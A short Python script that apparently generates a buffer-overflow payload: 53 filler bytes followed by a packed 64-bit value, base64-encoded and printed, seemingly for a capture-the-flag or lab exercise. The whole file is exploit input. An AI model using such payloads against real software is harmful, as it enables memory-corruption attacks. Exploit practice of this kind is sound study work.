
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<Q', 12937941077781933779)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
